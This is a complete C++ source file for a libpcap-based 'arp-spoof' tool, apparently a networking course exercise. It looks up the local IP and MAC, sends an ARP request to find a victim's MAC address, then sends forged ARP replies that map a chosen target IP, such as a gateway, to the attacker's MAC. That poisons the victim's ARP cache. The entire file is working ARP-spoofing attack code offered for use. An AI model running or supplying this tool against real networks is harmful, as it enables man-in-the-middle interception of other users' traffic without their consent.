#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp-spoof wlan0 192.168.1.2 192.168.1.1 192.168.1.3 192.168.1.4\n");
}

bool get_my_ip(const char* dev, Ip* ip) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    int ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0) {
        perror("ioctl failed");
        close(sockfd);
        return false;
    }

    sockaddr_in* sin = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
    *ip = ntohl(sin->sin_addr.s_addr);

    close(sockfd);
    return true;
}

bool get_my_mac(const char* dev, Mac* mac) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    int ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        perror("ioctl failed");
        close(sockfd);
        return false;
    }

    uint8_t* hwaddr = reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data);
    memcpy(mac, hwaddr, Mac::SIZE);

    close(sockfd);
    return true;
}

bool find_victim_mac(pcap_t* handle, Ip sender_ip, Mac my_mac, Ip my_ip, Mac* victim_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply_data;
        res = pcap_next_ex(handle, &header, &reply_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }

        EthArpPacket* reply_packet = (EthArpPacket*)reply_data;

        if (reply_packet->eth_.type() != EthHdr::Arp ||
            reply_packet->arp_.hrd() != ArpHdr::ETHER ||
            reply_packet->arp_.pro() != EthHdr::Ip4 ||
            reply_packet->arp_.hln() != Mac::SIZE ||
            reply_packet->arp_.pln() != Ip::SIZE ||
            reply_packet->arp_.op() != ArpHdr::Reply ||
            reply_packet->arp_.sip() != sender_ip ||
            reply_packet->arp_.tmac() != my_mac) {
            continue;
        }

        *victim_mac = reply_packet->arp_.smac();
        return true;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // Get my IP and MAC address
    Ip my_ip;
    Mac my_mac;
    if (!get_my_ip(dev, &my_ip) || !get_my_mac(dev, &my_mac)) {
        fprintf(stderr, "Failed to get my IP or MAC address\n");
        return -1;
    }

    printf("My IP: %s\n", std::string(my_ip).c_str());
    printf("My MAC: %s\n", std::string(my_mac).c_str());

    // Process the (sender IP, victim IP) pairs.
    for (int i = 2; i < argc; i += 2) {
        char* sender_ip_str = argv[i];
        char* target_ip_str = argv[i + 1];

        // Find victim's MAC address by sending ARP request
        Ip sender_ip(sender_ip_str);
        Mac victim_mac;

        if (!find_victim_mac(handle, sender_ip, my_mac, my_ip, &victim_mac)) {
            fprintf(stderr, "Failed to get victim's MAC address\n");
            return -1;
        }

        printf("Sender IP: %s\n", sender_ip_str);
        printf("Sender MAC: %s\n", std::string(victim_mac).c_str());

        Ip new_sender_ip(target_ip_str);
        printf("New Sender IP: %s\n", target_ip_str);

        EthArpPacket packet;

        // Construct a fake ARP reply packet
        packet.eth_.dmac_ = victim_mac;
        packet.eth_.smac_ = my_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = my_mac;
        packet.arp_.sip_ = htonl(new_sender_ip);
        packet.arp_.tmac_ = victim_mac;
        packet.arp_.tip_ = htonl(sender_ip);

        // Send the fake ARP reply
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }

        printf("New Sender MAC: %s\n", std::string(my_mac).c_str());
    }

    pcap_close(handle);
}
